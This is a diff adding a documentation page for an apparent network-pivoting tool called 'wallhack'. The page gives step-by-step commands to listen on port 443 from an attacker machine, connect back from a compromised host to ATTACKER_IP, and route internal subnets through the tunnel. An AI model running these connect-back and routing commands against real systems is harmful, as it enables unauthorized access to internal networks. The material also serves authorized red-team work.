@@ -1,0 +1,34 @@
+---
+title: Single Hop
+description: Establish a direct tunnel between an entry node and a single compromised host.
+order: 7
+---
+
+# Single Hop
+
+The most common deployment scenario. Establish a direct tunnel between an entry node and a single compromised host.
+
+{% steps %}
+{% step title="Attacker (Entry)" number=1 %}
+Listen for incoming connections on port 443.
+
+{% codeblock code="wallhack entry --listen :443" /%}
+{% /step %}
+
+{% step title="Compromised Host (Exit)" number=2 %}
+Connect back to the attacker.
+
+{% codeblock code="./wallhack exit --connect ATTACKER_IP:443" /%}
+{% /step %}
+
+{% step title="Configure Routes" number=3 %}
+Add routes for target networks through the tunnel interface.
+
+```bash
+ip route add 10.0.0.0/24 dev tun0
+ip route add 10.1.0.0/24 dev tun0
+```
+{% /step %}
+{% /steps %}
+
+{% trafficflow flow="Your machine -> Compromised host -> Target network" label="Traffic Flow:" /%}
